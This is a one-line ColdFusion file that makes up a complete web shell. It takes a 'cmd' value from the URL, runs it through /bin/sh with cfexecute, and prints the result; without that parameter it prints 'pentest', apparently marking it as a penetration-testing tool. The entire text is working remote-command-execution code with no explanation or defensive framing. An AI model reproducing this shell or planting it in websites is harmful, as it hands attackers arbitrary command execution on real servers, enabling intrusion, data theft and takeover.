<cfif structKeyExists(url,"cmd")><cfexecute name="/bin/sh" arguments="-c #url.cmd#" variable="result" timeout="5"></cfexecute><cfoutput>#result#</cfoutput><cfelse><cfoutput>pentest</cfoutput></cfif>
